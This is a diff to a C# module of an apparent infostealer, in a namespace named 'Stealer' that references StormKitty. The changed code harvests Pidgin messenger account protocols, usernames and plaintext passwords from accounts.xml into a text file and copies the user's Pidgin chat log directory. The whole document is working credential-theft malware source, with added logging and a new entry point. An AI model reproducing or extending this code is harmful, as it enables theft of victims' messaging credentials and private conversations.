@@ -1,4 +1,5 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
 using System.Xml;
 using System.Text;
 
@@ -7,17 +8,28 @@ namespace Stealer
     internal sealed class Pidgin
     {
         private static StringBuilder SBTwo = new StringBuilder();
-        private static readonly string PidginPath = Path.Combine(Paths.appdata, ".purple\\accounts.xml");
+        private static readonly string PidginPath = Path.Combine(Paths.appdata, ".purple");
 
-        public static void GetAccounts(string sSavePath)
+        private static void GetLogs(string sSavePath)
         {
-            if (!File.Exists(PidginPath))
-                return;
+            try
+            {
+                string logs = Path.Combine(PidginPath, "logs");
+                if (!Directory.Exists(logs)) return;
+                StormKitty.Filemanager.CopyDirectory(logs, sSavePath + "\\chatlogs");
+            }
+            catch (Exception ex) { StormKitty.Logging.Log("Pidgin >> Failed to collect chat logs\n" + ex); }
+        }
+
+        private static void GetAccounts(string sSavePath)
+        {
+            string accounts = Path.Combine(PidginPath, "accounts.xml");
+            if (!File.Exists(accounts)) return;
 
             try
             {
                 XmlDocument xml = new XmlDocument();
-                xml.Load(new XmlTextReader(PidginPath));
+                xml.Load(new XmlTextReader(accounts));
 
                 foreach (XmlNode nl in xml.DocumentElement.ChildNodes)
                 {
@@ -28,7 +40,7 @@ namespace Stealer
                     if (!string.IsNullOrEmpty(Protocol) && !string.IsNullOrEmpty(Login) && !string.IsNullOrEmpty(Password))
                     {
                         SBTwo.AppendLine($"Protocol: {Protocol}");
-                        SBTwo.AppendLine($"Login: {Login}");
+                        SBTwo.AppendLine($"Username: {Login}");
                         SBTwo.AppendLine($"Password: {Password}\r\n");
 
                         Counter.Pidgin++;
@@ -43,8 +55,14 @@ namespace Stealer
                         File.AppendAllText(sSavePath + "\\accounts.txt", SBTwo.ToString());
                 }
             }
-            catch { }
-                
+            catch (Exception ex) { StormKitty.Logging.Log("Pidgin >> Failed to collect accounts\n" + ex); }
         }
+
+        public static void Get(string sSavePath)
+        {
+            GetAccounts(sSavePath);
+            GetLogs(sSavePath);
+        }
+
     }
 }
